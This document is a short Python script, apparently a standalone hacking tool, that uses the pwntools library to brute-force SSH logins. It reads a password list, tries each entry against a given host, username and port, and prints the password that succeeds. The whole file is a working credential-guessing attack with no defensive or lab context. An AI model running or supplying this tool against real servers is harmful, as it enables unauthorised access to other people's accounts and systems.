from pwn import *
import argparse
import termcolor


def checker(host,user,password,port):
    try:
        response=ssh(host=host, user=user, password=password, port=int(port), timeout='1')
        print(termcolor.colored((f"[+] connected, password: {password}"),'green'))
        return 1
    except:
        pass


parser=argparse.ArgumentParser()
parser.add_argument("host",help="provide host IP address")
parser.add_argument("-u","--username",help="provide the username")
parser.add_argument("-P","--passwordfile",help="provide the file containing passwords")
parser.add_argument("-p","--port",help="provide the port number (default is 22)")
args=parser.parse_args()
if args.port:
        port=args.port
else:
        port=22
if args.passwordfile:
    with open(args.passwordfile,"r") as passwordlist:
        for line in passwordlist:
            password=line.strip()
            response=checker(args.host,args.username,password,port)
            if response==1:
                    break

else:
    with open("passwordfile.txt","r") as passwordlist:
        for line in passwordlist:
            password=line.strip()
            response=checker(args.host,args.username,password,port)
            if response==1:
                    break

